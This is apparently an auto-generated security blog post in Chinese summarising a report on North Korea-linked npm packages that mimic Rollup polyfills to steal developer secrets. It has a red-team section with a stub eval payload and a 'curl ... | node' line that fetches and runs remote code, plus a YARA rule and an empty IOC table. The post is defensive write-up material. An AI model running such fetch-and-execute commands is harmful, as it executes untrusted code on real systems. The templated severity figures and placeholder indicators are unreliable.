---
layout: post
title:  "North Korea-Linked npm Packages Mimic Rollup Polyfills to Steal Developer Secrets"
date:   2026-07-03 19:07:14 +0000
categories: [security]
severity: critical
---

# 🚨 解析北韓威脅行為者利用 npm 套件進行遠端存取和資料竊取的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: npm 套件竊聽、JavaScript 惡意程式、遠端存取和資料竊取

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 北韓威脅行為者利用 npm 套件的 polyfill 功能，創建了假的套件以進行遠端存取和資料竊取。
* **攻擊流程圖解**:
  1. 使用者安裝假的 npm 套件（例如 `rollup-packages-polyfill-core` 或 `rollup-runtime-polyfill-core`）。
  2. 套件安裝後，會下載和執行第二階段的套件（例如 `swift-parse-stream` 或 `quirky-token`）。
  3. 第二階段的套件會從 JSONKeeper 下載 JSON 物件，並使用 `eval` 函數執行惡意程式碼。
  4. 惡意程式碼會進行環境檢查，避免在雲端開發環境、沙盒、伺服器端執行環境和分析基礎設施中執行。
  5. 如果環境檢查通過，惡意程式碼會下載和執行額外的套件，包括 `@nut-tree-fork/nut-js`，以進行遠端存取和資料竊取。
* **受影響元件**: npm 套件版本號和環境。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝假的 npm 套件。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 範例 Payload
    const payload = {
      "type": "javascript",
      "data": "eval('...')"
    };
    
    ```
* **範例指令**: 使用 `curl` 下載和執行惡意程式碼。

```

bash
curl -X GET 'https://example.com/malicious-code.js' | node

```
* **繞過技術**: 使用 `eval` 函數執行惡意程式碼，避免被偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_npm_package {
      meta:
        description = "偵測假的 npm 套件"
      strings:
        $a = "rollup-packages-polyfill-core"
        $b = "rollup-runtime-polyfill-core"
      condition:
        $a or $b
    }
    
    ```
* **緩解措施**: 移除假的 npm 套件，更新 npm 套件版本號，啟用依賴關係掃描。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: 一個 Node.js 的套件管理器，允許使用者安裝和管理套件。
* **polyfill**: 一個用於提供舊版瀏覽器或 Node.js 環境中缺失的功能的套件。
* **eval**: 一個 JavaScript 函數，允許執行字符串中的程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


